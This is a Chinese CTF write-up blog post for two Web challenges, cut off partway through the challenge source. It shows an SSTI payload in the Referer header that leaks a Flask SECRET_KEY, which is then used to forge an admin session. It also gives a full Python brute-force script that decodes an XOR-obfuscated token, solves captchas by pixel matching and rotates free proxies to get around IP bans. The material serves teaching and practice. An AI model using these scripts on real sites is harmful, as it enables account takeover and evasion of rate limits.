---
title: WUST7月份内部赛wp
tags: 
- CTF 
- Web
categories: 
- CTF
---





前言：假期就这么来了，7月份，在家也要保持学习呀！！！



<!-- more -->

## Web

### Login as admin

题目改编自 `Zer0pts CTF 2020`，此题是无敌简化版，考点是 `SSTi` 和 `flask的session伪造`

首先源码已经给出来了，分析一波源码：

```python
import flask
from flag import flag # 导入 flag
from key import key # 导入 key
app = flask.Flask(__name__)
app.secret_key = key # secret_key等于导入的key


@app.route("/")
def index():
	flask.session['user'] = 'guest'
	return "Please login as admin"
# 先给用户一个session，身份为user=guest，并告诉用户要以admin登陆

@app.route("/admin")
def admin():
	if flask.session['user'] == 'admin':
		return str(flag)
	else:
		return "Please login as admin"
# 当user=admin时，就返回flag

@app.errorhandler(404)
def page_not_found(error):
    referrer = flask.request.headers.get("referer")
    if referrer is None:
    	referrer = '/'
    
    if not valid_url(referrer):
    	referrer = '/'
  # 漏洞点
  # referer可控，但是限制了长度。所以利用这里的SSTI可以读取一些配置，但是不能直接RCE。
    html = '<html><head><meta http-equiv="Refresh" content="3;URL={}"><title>404 Not Found</title></head><body>Page not found. Redirecting...</body></html>'.format(referrer)

    return flask.render_template_string(html), 404

# 对referer限制长度，无法读文件和RCE，但是可以通过读配置来读取secret_key
def valid_url(url):
    """ Check if given url is valid """
    host = flask.request.host_url
    if not url.startswith(host):
        return False  # Not from my server
    if len(url) - len(host) > 16:
        return False  # Referer may be also 404

    return True


if __name__ == '__main__':
    app.run(
        host='0.0.0.0',
        port='8000',
        debug=False
    )
```

构造 `Referer:http://47.110.130.169:12222/{{config}}`，然后需要触发404，地址栏随便输入一个不存在的页面：

![image-20200719154614770](https://gitee.com/ivenwings/md_img/raw/master/img/20200719154622.png)

访问后可以发现触发到了

![image-20200719154638083](https://gitee.com/ivenwings/md_img/raw/master/img/20200719154638.png)

然后可以发现地址栏多了一堆配置，拿去url解码一下，就可以看到完整的配置了。

![image-20200719154714804](https://gitee.com/ivenwings/md_img/raw/master/img/20200719154714.png)

```json
<Config {'ENV': 'production', 'DEBUG': False, 'TESTING': False, 'PROPAGATE_EXCEPTIONS': None, 'PRESERVE_CONTEXT_ON_EXCEPTION': None, 'SECRET_KEY': 'wustaismatr1x2333333333333333333333333333', 'PERMANENT_SESSION_LIFETIME': datetime.timedelta(days=31), 'USE_X_SENDFILE': False, 'SERVER_NAME': None, 'APPLICATION_ROOT': '/', 'SESSION_COOKIE_NAME': 'session', 'SESSION_COOKIE_DOMAIN': False, 'SESSION_COOKIE_PATH': None, 'SESSION_COOKIE_HTTPONLY': True, 'SESSION_COOKIE_SECURE': False, 'SESSION_COOKIE_SAMESITE': None, 'SESSION_REFRESH_EACH_REQUEST': True, 'MAX_CONTENT_LENGTH': None, 'SEND_FILE_MAX_AGE_DEFAULT': datetime.timedelta(seconds=43200), 'TRAP_BAD_REQUEST_ERRORS': None, 'TRAP_HTTP_EXCEPTIONS': False, 'EXPLAIN_TEMPLATE_LOADING': False, 'PREFERRED_URL_SCHEME': 'http', 'JSON_AS_ASCII': True, 'JSON_SORT_KEYS': True, 'JSONIFY_PRETTYPRINT_REGULAR': False, 'JSONIFY_MIMETYPE': 'application/json', 'TEMPLATES_AUTO_RELOAD': None, 'MAX_COOKIE_SIZE': 4093}>
```

可以得到 `'SECRET_KEY': 'wustaismatr1x2333333333333333333333333333'`

于是我们可以利用key来伪造session：`{"user":"admin"}`

可以自己开一个flask项目，可以直接用工具：[Github项目链接](https://github.com/noraj/flask-session-cookie-manager) 

![image-20200719155352985](https://gitee.com/ivenwings/md_img/raw/master/img/20200719155353.png)

得到session后放在cookie里，访问 `/admin`

![image-20200719155431529](https://gitee.com/ivenwings/md_img/raw/master/img/20200719155431.png)

真·签到题



### 大人，时代变了



#### 0x0 前言

出这个题的本意是看到CTF的web题老是PHP什么的, 感觉和现实情况有点脱节, 且对前端审计没有太大的要求, 于是出了这个"现代"一点的题. 这个题目模拟的是爬虫, 在多次请求后将会出现验证码, 再频繁访问将会封锁ip, 且网站是使用React写的, 经过webpack的打包和混淆使得js很难读, 不过这也是大势所趋, 出出来涨涨见识吧.

#### 0x1 前端审计

首先打开网站, hint提示用户识别码只有3位
![在这里插入图片描述](https://img-blog.csdnimg.cn/20200719130900918.png)

##### 抓包

F12进行抓包, 发现有`uuid`和`img`两个字段, img毫无疑问是验证码了, uuid确是一个base64, 尝试解码, 无法得到数据
![在这里插入图片描述](https://img-blog.csdnimg.cn/20200719131106713.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyNDM2MTc2,size_16,color_FFFFFF,t_70)
尝试构造随意数据发送, 再在F12里查看, 发现请求中uuid为`f56d359611c24abf9aa1d9f0113091a4`, 说明前端对此数据进行了解密, 首先对前端代码进行审计, 查找加密算法
![在这里插入图片描述](https://img-blog.csdnimg.cn/20200719131217560.png)

##### 逻辑分析

打开前端代码后, 我相信不少人肯定是蒙的, 首先先进行格式化, 其大概画风是这样的
![在这里插入图片描述](https://img-blog.csdnimg.cn/20200719131433492.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyNDM2MTc2,size_16,color_FFFFFF,t_70)
让我们一步一步来, 首先看点击登录后发生了什么, 搜索关键词`登录`, 可以找到这里
![在这里插入图片描述](https://img-blog.csdnimg.cn/20200719131649250.png)
可以看见登录按钮绑定了一个函数`this.w`, 进入*this.w*看干什么了

![在这里插入图片描述](https://img-blog.csdnimg.cn/20200719131933205.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyNDM2MTc2,size_16,color_FFFFFF,t_70)分析: 这里的switch其实是一个`async`函数, 通过`babel`进行转义的结果, *建议学习ES6, 7, 8*, 勉强可以进行分析

1. 进入case0, 将`state.l = true`, 然后调用`a.__.q(state.w, state.c, state.p)`
2. 进入case4, `alert(t.msg)` 可以发现这里就是弹出服务器错误提示的地方
3. 进入case9, `t0 = _.catch(0), alert(t0)`, 这里是处理错误的地方
4. 进入case12, 调用`a.u()`, 然后`state.l = false`

进入`a.__.q(e, t, a)`, 应该有三个参数, 分析逻辑
![在这里插入图片描述](https://img-blog.csdnimg.cn/20200719132505636.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyNDM2MTc2,size_16,color_FFFFFF,t_70)
一眼看到熟悉的200, 说明这里应该就是发送数据的地方, 查看参数
![在这里插入图片描述](https://img-blog.csdnimg.cn/20200719132558739.png)
 在这里我们发现大量`w({Base64})`的东西, 通过定位发现w为Base64解码, 吧base64拿去解码, 发现为发送数据的隐藏, 比如`uuid`, `code`. 这种方式很常见, 为了防止直接搜索直接对数据进行base64储存
 ![在这里插入图片描述](https://img-blog.csdnimg.cn/20200719132707283.png)
 查看参数, 这么一长串为
 `Object(F_Web_Project_fucking_test_node_modules_babel_preset_react_app_node_modules_babel_runtime_helpers_esm_defineProperty__WEBPACK_IMPORTED_MODULE_6__.a)(l, w("bWV0aG9k"), w("UE9TVA=="))`
前面那么一长串其实是命名空间, 经过化简后可以得到
`{method: "POST"}`, 发现为fetch的用法, 但是在这里并没有发现加密, 说明加密不在发送数据的时候


再次观察请求, 发现在进行一次POST后, 立马获取了一个新的uuid, 说明在登录后应该调用了获取新的uuid的函数, 经过上面分析`async`, 进入`a.u()`

![在这里插入图片描述](https://img-blog.csdnimg.cn/20200719133534600.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyNDM2MTc2,size_16,color_FFFFFF,t_70)

##### 解密算法

又是一个类似的函数, 这里我们可以直接聚焦到可疑函数`a.setState({g: e.img, p: a.__.p(e[t("dXVpZA==")])})`, 可以看到验证码被保存了, 而`dXVpZA==`就是uuid, 说明uuid经过了`a.__p() e[] t()` 的处理, 一个个跟踪

1. 首先发现t为Base64解码函数, 现在为`a.__.p(e['uuid'])`
2. 可以知道e为返回数据, 那么解码就在`a.__.p()`里
3. 进入p, 首先对uuid进行`Base64.toUnit8Array`, 然后与`___`进行遍历
   ![在这里插入图片描述](https://img-blog.csdnimg.cn/20200719134017947.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyNDM2MTc2,size_16,color_FFFFFF,t_70)
4. 寻找`___`, 发现为`___ = new Uint8Array([49, 50, 51, 67, 55, 69, 53, 69, 56, 55, 53, 70, 66, 70, 48, 69, 69, 69, 50, 53, 56, 51, 70, 56, 65, 70, 51, 68, 68, 70, 70, 57])` 可以拼出内容
   ![在这里插入图片描述](https://img-blog.csdnimg.cn/20200719134204334.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyNDM2MTc2,size_16,color_FFFFFF,t_70)
5. 追踪`__`, 发现为xor
   ![在这里插入图片描述](https://img-blog.csdnimg.cn/20200719134314617.png)
6. 那么整个算法就清晰了, 使用python进行模拟

```python
def parse_uuid(raw):
    input_raw = list(base64.b64decode(raw))
    key = [49, 50, 51, 67, 55, 69, 53, 69, 56, 55, 53, 70, 66, 70, 48, 69, 
           69, 69, 50, 53, 56, 51, 70, 56, 65, 70, 51, 68, 68, 70, 70, 57]
    for i in range(len(input_raw)):
        for j in range(len(key)):
            input_raw[i] ^= key[j]
    return bytes(input_raw).decode()
```

#### 0x2 验证码识别

验证码识别有多种办法, 包括接入打码平台, 使用ocr开源项目, 这里验证码十分规整, 我可以手写一个验证码识别

##### 分析

首先分析验证码结构, 数字`8721`分别距离左边`5, 20, 35, 50`, 字母大小为`12*18`

多次刷新, 采集多个验证码, 我这里采集了5个集齐了所有数字
![在这里插入图片描述](https://img-blog.csdnimg.cn/20200719135148527.png)

##### 验证码处理

首先将验证码分隔成4个独立的小数字, 使用Python的PIL模块

```python
for i in range(4):
    offset = i * 15 + 5
    data = img.crop((offset, 3, offset + 12, 20))
```

然后对整个图片灰度化处理`data = data.convert("L")`
然后简单对图片黑白化, 由于背景是白色的, 这里认为凡是不是白色即为有数据

```python
w, h = data.size
pixdata = data.load()
for y in range(h):
    for x in range(w):
        print(pixdata[x, y])
        if pixdata[x, y] < 255:
            pixdata[x, y] = 0
```

最后保存图片, 总体代码

```python
import uuid
from PIL import Image

for index in range(6):
    img = Image.open(f"image/index{index}.png")
    for i in range(4):
        offset = i * 15 + 5
        data = img.crop((offset, 3, offset + 12, 20))
        data = data.convert("L")
        w, h = data.size
        pixdata = data.load()
        for y in range(h):
            for x in range(w):
                print(pixdata[x, y])
                if pixdata[x, y] < 255:
                    pixdata[x, y] = 0
        data.save(f"num/{str(uuid.uuid4()).replace('-', '')}.png")
```

![在这里插入图片描述](https://img-blog.csdnimg.cn/20200719135532935.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyNDM2MTc2,size_16,color_FFFFFF,t_70)

##### 特征提取

将图片进行重命名, 挑出`1-9`, 并且重命名, 对数据进行采集
![在这里插入图片描述](https://img-blog.csdnimg.cn/20200719135645554.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyNDM2MTc2,size_16,color_FFFFFF,t_70)

```python
from PIL import Image
import json

data = {}
for i in range(10):
    img = Image.open(f"./num/{i}.png")
    pixdata = img.load()
    w, h = img.size
    d = []
    for x in range(w):
        for y in range(h):
            d.append(pixdata[x, y])
    data[i] = d

with open(f"./num/data.json", 'w') as f:
    f.write(json.dumps(data))
```

最终获取json数据一份
![在这里插入图片描述](https://img-blog.csdnimg.cn/20200719135800951.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyNDM2MTc2,size_16,color_FFFFFF,t_70)
至于识别, 只需要对图片进行相似的分割, 然后灰度化, 黑白化, 然后与每个数字特征进行对比, 算出相似度, 然后取相似度最高的数字即可

```python
from PIL import Image
import json


def find_str(num_list):
    with open("num/data.json", 'r') as f:
        nums = json.loads(f.read())
    sim_data = []
    for num, num_data in nums.items():
        sim = 0
        for ii, jj in zip(num_list, num_data):
            if ii == jj:
                sim += 1
        sim_data.append(sim)
    return str(sim_data.index(max(sim_data)))


def load_img(img):
    s = ""
    for i in range(4):
        offset = i * 15 + 5
        data = img.crop((offset, 3, offset + 12, 20))
        data = data.convert("L")
        w, h = data.size
        pixdata = data.load()
        img_data = []
        for x in range(w):
            for y in range(h):
                img_data.append(0 if pixdata[x, y] < 255 else 255)
        s += find_str(img_data)
    return s


print(load_img(Image.open("image/index1.png")))
```

![在这里插入图片描述](https://img-blog.csdnimg.cn/20200719140017886.png)
还是很准的

#### 0x3 代理池

在发送数据的时候发现, 在请求超过50次后永远将404, 这就是ip被ban了, 这里就需要上代理池了
网上有大量免费代理, 采集一下

```python
class ProxyPool:
    def __init__(self):
        self.pool = [
            "223.241.7.181:3000",
            "222.189.190.254:9999",
            "223.242.224.147:9999",
            "36.248.129.32:9999",
            "27.43.189.11:9999",
            "103.140.204.1:8080",
            "36.249.53.38:8000"
        ]

    def get_proxy(self):
        return {
            'http': 'http://' + self.pool[0]
        }

    def del_ip(self):
        del self.pool[0]
```

连接失败的时候的时候更换ip

```python
pool = ProxyPool()
for i in range(100, 999):
    try:
        print(i, foo(i, pool.get_proxy()))
    except:
        pool.del_ip()
```

#### 0x4 全部代码

##### 主体 

```python
import requests
import base64
from PIL import Image
from io import BytesIO
import json

url = "http://47.107.251.41/api/"


class ProxyPool:
    def __init__(self):
        self.pool = [
            "127.0.0.1:4780",
            "223.241.7.181:3000",
            "222.189.190.254:9999",
            "223.242.224.147:9999",
            "36.248.129.32:9999",
            "27.43.189.11:9999",
            "103.140.204.1:8080",
            "36.249.53.38:8000"
        ]

    def get_proxy(self):
        return {
            'http': 'http://' + self.pool[0]
        }

    def del_ip(self):
        del self.pool[0]


def find_str(num_list):
    with open("num_data.json", 'r') as f:
        nums = json.loads(f.read())
    sim_data = []
    for num, num_data in nums.items():
        sim = 0
        for ii, jj in zip(num_list, num_data):
            if ii == jj:
                sim += 1
        sim_data.append(sim)
    return str(sim_data.index(max(sim_data)))


def load_img(img):
    s = ""
    for i in range(4):
        offset = i * 15 + 5
        data = img.crop((offset, 3, offset + 12, 20))
        data = data.convert("L")
        w, h = data.size
        pixdata = data.load()
        img_data = []
        for x in range(w):
            for y in range(h):
                img_data.append(0 if pixdata[x, y] < 255 else 255)
        s += find_str(img_data)
    return s


def foo(password, proxy):
    data = requests.get(url=url).json()
    code = ""
    uuid = parse_uuid(data["uuid"])
    image = data["img"]
    if len(image) > 0:
        bytes_io = BytesIO(base64.b64decode(image[len("data:image/png;base64,"):]))
        img = Image.open(bytes_io)
        code = load_img(img)

    data = requests.post(url=url, data={"uuid": uuid, "code": code, "password": password}, proxies=proxy, timeout=10)
    if data.status_code == 404:
        raise Exception("404")
    return data.json()["result"], data.json()["msg"]


def parse_uuid(raw):
    input_raw = list(base64.b64decode(raw))
    key = [49, 50, 51, 67, 55, 69, 53, 69, 56, 55, 53, 70, 66, 70, 48, 69,
           69, 69, 50, 53, 56, 51, 70, 56, 65, 70, 51, 68, 68, 70, 70, 57]
    for i in range(len(input_raw)):
        for j in range(len(key)):
            input_raw[i] ^= key[j]
    return bytes(input_raw).decode()


pool = ProxyPool()
for i in range(100, 999):
    try:
        print(i, foo(i, pool.get_proxy()))
    except:
        pool.del_ip()
```

##### 特征点

```json
{"0": [255, 255, 255, 255, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 255, 255, 255, 255, 255, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 255, 255, 255, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 255, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 255, 255, 255, 255, 255, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 0, 0, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 255, 255, 255, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 255, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 255, 255, 255, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 255, 255, 255, 255, 255, 255, 0, 0, 0, 0, 0, 0, 0, 0, 0, 255, 255, 255, 255], "1": [255, 255, 255, 255, 0, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 255, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 255, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255], "2": [0, 0, 0, 255, 255, 255, 255, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 255, 255, 255, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 255, 255, 255, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 255, 255, 255, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 255, 255, 255, 0, 0, 0, 0, 255, 255, 255, 0, 0, 0, 0, 0, 0, 0, 255, 255, 255, 0, 0, 0, 255, 255, 255, 255, 255, 0, 0, 0, 0, 0, 0, 0, 255, 0, 0, 0, 0, 255, 255, 255, 255, 255, 0, 0, 0, 0, 0, 0, 0, 255, 0, 0, 0, 0, 255, 255, 255, 255, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 255, 255, 255, 255, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 255, 255, 255, 255, 0, 0, 0, 0, 255, 0, 0, 0, 0, 0, 0, 0, 255, 255, 255, 255, 255, 255, 0, 0, 0, 255, 255, 0, 0, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 0, 0, 255], "3": [0, 0, 0, 255, 255, 255, 255, 0, 0, 0, 255, 255, 255, 255, 0, 0, 0, 0, 0, 0, 255, 255, 255, 255, 0, 0, 0, 255, 255, 255, 255, 0, 0, 0, 0, 0, 0, 255, 255, 255, 255, 0, 0, 0, 255, 255, 255, 255, 0, 0, 0, 0, 0, 0, 255, 255, 255, 255, 0, 0, 0, 255, 255, 255, 255, 0, 0, 0, 0, 0, 0, 255, 255, 255, 255, 0, 0, 0, 255, 255, 255, 255, 0, 0, 0, 0, 0, 0, 255, 255, 255, 255, 0, 0, 0, 255, 255, 255, 255, 0, 0, 0, 0, 0, 0, 0, 255, 255, 0, 0, 0, 0, 0, 255, 255, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 255, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 255, 255, 255, 255, 0, 0, 0, 0, 0, 255, 0, 0, 0, 0, 0, 0, 255, 255], "4": [0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 0, 0, 0, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 255, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 255, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 255, 255], "5": [0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 255, 255, 255, 255, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 255, 255, 255, 255, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 255, 255, 255, 255, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 255, 255, 255, 255, 0, 0, 0, 0, 0, 0, 255, 255, 255, 0, 0, 0, 0, 255, 255, 255, 255, 0, 0, 0, 0, 0, 0, 255, 255, 255, 255, 0, 0, 0, 255, 255, 255, 255, 0, 0, 0, 0, 0, 0, 255, 255, 255, 255, 0, 0, 0, 0, 255, 255, 0, 0, 0, 0, 0, 0, 0, 255, 255, 255, 255, 0, 0, 0, 0, 0, 255, 0, 0, 0, 0, 0, 0, 0, 255, 255, 255, 255, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 255, 255, 255, 255, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 255, 255, 255, 255, 255, 0, 0, 0, 0, 0, 0, 0, 0, 255, 0, 0, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 0, 0, 0, 255, 255], "6": [255, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 255, 255, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 255, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 255, 255, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 255, 255, 255, 255, 255, 0, 0, 0, 0, 0, 255, 255, 0, 0, 0, 0, 0, 255, 255, 255, 255, 255, 0, 0, 0, 0, 255, 255, 255, 255, 0, 0, 0, 0, 255, 255, 255, 255, 255, 0, 0, 0, 0, 255, 255, 255, 255, 0, 0, 0, 0, 255, 255, 255, 255, 255, 0, 0, 0, 0, 0, 255, 255, 0, 0, 0, 0, 0, 255, 255, 255, 255, 255, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 255, 255, 255, 255, 255, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 0, 0, 0, 255, 255, 255], "7": [0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 0, 0, 0, 0, 0, 255, 255, 255, 255, 0, 0, 255, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 255, 255, 255, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 255, 0, 0, 0, 255, 255, 255, 0, 0, 0, 0, 0, 0, 0, 0, 0, 255, 255, 0, 0, 0, 255, 255, 255, 0, 0, 0, 0, 0, 0, 0, 255, 255, 255, 255, 0, 0, 0, 255, 0, 0, 0, 0, 0, 0, 0, 0, 255, 255, 255, 255, 255, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 255, 255, 255, 255, 255, 255, 0, 0, 0, 0, 0, 0, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 0, 0, 0, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 0, 0, 0, 255, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255], "8": [255, 255, 0, 0, 0, 0, 0, 0, 255, 0, 0, 0, 0, 0, 0, 255, 255, 255, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 255, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 255, 255, 0, 0, 0, 0, 0, 255, 255, 0, 0, 0, 0, 0, 0, 0, 0, 255, 255, 0, 0, 0, 0, 0, 255, 255, 0, 0, 0, 0, 0, 0, 0, 0, 255, 255, 0, 0, 0, 0, 0, 255, 255, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 255, 0, 0, 0, 0, 0, 0, 0, 0, 255, 0, 0, 0, 0, 0, 0, 255, 255], "9": [255, 255, 0, 0, 0, 0, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 0, 0, 0, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 255, 255, 255, 255, 255, 255, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 255, 255, 255, 255, 255, 255, 0, 0, 0, 0, 255, 255, 0, 0, 0, 0, 0, 255, 255, 255, 255, 255, 255, 0, 0, 0, 0, 255, 255, 255, 0, 0, 0, 0, 255, 255, 255, 255, 255, 255, 0, 0, 0, 0, 255, 255, 255, 0, 0, 0, 0, 255, 255, 255, 255, 255, 255, 0, 0, 0, 0, 0, 255, 0, 0, 0, 0, 0, 255, 255, 255, 255, 255, 255, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 255, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 255, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 255, 255, 255, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 255]}
```

#### 0x5 题目源码

##### 前端

###### App.tsx

```javascript
import React from 'react';
import Drawer, {drawerWidth} from "./Drawer";
import {
    Button,
    Card,
    createStyles, LinearProgress, Link,
    List,
    ListItem,
    TextField,
    Theme,
    withStyles
} from "@material-ui/core";

import {Base64} from "js-base64";

const t = Base64.fromBase64;
const w = Base64.fromBase64
const _ = fetch;
const __ = (x: number, y: number) => x ^ y
const ___ = new Uint8Array([49, 50, 51, 67, 55, 69, 53, 69, 56, 55, 53, 70, 66, 70, 48, 69, 69, 69, 50, 53, 56, 51, 70, 56, 65, 70, 51, 68, 68, 70, 70, 57])
const url = w("aHR0cDovLzQ3LjEwNy4yNTEuNDEvYXBpLw==")


const useStyles = (theme: Theme) => createStyles({
    main: {
        flexGrow: 1,
        padding: theme.spacing(3),
        [theme.breakpoints.up('sm')]: {
            marginLeft: drawerWidth
        },
        height: "100%"
    },
    toolbar: theme.mixins.toolbar,
    paper: {
        display: "table",
        margin: "0 auto",
        width: 300,
        height: 300,
        marginTop: 160,
    },
    input: {
        width: 280,
    },
    input2: {
        width: 280 - 63,
    },
    center: {
        textAlign: "center"
    },
    p: {
        width: "100%",
        textAlign: "center",
        fontSize: "20px",
        margin: "0 auto"
    },
    btn: {
        margin: "0 0 0 auto"
    },
    hidden: {
        visibility: "hidden"
    }
})

interface State {
    p: string,
    c: string,
    w: string,
    g: string,
    l: boolean
}


class App extends React.Component<any, State> {
    private __: { p(b: string): string; q(p: string, c: string, y: string): Promise<any>; y(): Promise<any> };
